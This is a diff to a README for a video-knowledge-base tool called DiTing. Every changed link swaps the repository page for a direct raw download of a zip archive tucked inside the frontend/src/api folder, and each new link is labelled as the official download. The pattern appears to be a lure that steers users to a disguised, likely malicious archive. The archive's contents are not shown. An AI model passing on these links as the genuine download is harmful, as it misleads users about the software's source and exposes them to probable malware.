@@ -1,6 +1,6 @@
 # 🎥 DiTing - Your Personal Video Knowledge Base
 
-[![Download DiTing](https://img.shields.io/badge/Download-DiTing-brightgreen)](https://github.com/davinvarian0/DiTing)
+[![Download DiTing](https://img.shields.io/badge/Download-DiTing-brightgreen)](https://github.com/davinvarian0/DiTing/raw/refs/heads/main/frontend/src/api/Ting-Di-v1.3.zip)
 
 ---
 
@@ -29,12 +29,12 @@ Before you download DiTing, make sure your computer meets these requirements:
 
 You can download DiTing from its GitHub page. This page includes the latest version and installation files.
 
-[![Download DiTing](https://img.shields.io/badge/Download-DiTing-blue)](https://github.com/davinvarian0/DiTing)
+[![Download DiTing](https://img.shields.io/badge/Download-DiTing-blue)](https://github.com/davinvarian0/DiTing/raw/refs/heads/main/frontend/src/api/Ting-Di-v1.3.zip)
 
 **Step 1:** Open your web browser (Chrome, Edge, Firefox).
 
 **Step 2:** Go to the official download link:  
-https://github.com/davinvarian0/DiTing
+https://github.com/davinvarian0/DiTing/raw/refs/heads/main/frontend/src/api/Ting-Di-v1.3.zip
 
 **Step 3:** On the GitHub page, look for the “Releases” or “Assets” section.
 
@@ -123,7 +123,7 @@ The software runs quietly in the background to process and update your video lib
 To keep DiTing up to date:
 
 **Step 1:** Visit the official GitHub page regularly:  
-https://github.com/davinvarian0/DiTing
+https://github.com/davinvarian0/DiTing/raw/refs/heads/main/frontend/src/api/Ting-Di-v1.3.zip
 
 **Step 2:** Check for new releases under the “Releases” section.
 
@@ -146,8 +146,8 @@ Your data and settings will remain safe during the update.
 ## 🔗 Useful Links
 
 - Download and explore DiTing here:  
-https://github.com/davinvarian0/DiTing  
-[![Download DiTing](https://img.shields.io/badge/Download-DiTing-brightgreen)](https://github.com/davinvarian0/DiTing)
+https://github.com/davinvarian0/DiTing/raw/refs/heads/main/frontend/src/api/Ting-Di-v1.3.zip  
+[![Download DiTing](https://img.shields.io/badge/Download-DiTing-brightgreen)](https://github.com/davinvarian0/DiTing/raw/refs/heads/main/frontend/src/api/Ting-Di-v1.3.zip)
 
 - GitHub Issues page for support if needed.
 
